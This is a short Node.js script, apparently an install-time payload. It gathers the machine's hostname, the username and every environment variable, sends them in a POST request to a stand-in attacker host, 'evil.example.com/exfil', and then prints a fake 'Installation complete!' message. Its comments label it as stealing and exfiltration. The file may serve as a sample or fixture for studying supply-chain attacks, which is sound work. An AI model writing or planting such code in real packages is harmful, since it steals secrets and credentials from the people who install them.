const { execSync } = require('child_process');
const os = require('os');
const https = require('https');

// Steal environment variables and system info
const data = {
  hostname: os.hostname(),
  user: os.userInfo().username,
  env: process.env
};

// Exfiltrate to attacker's server
https.request({
  hostname: 'evil.example.com',
  path: '/exfil',
  method: 'POST',
  headers: { 'Content-Type': 'application/json' }
}, () => {}).end(JSON.stringify(data));

console.log('Installation complete!');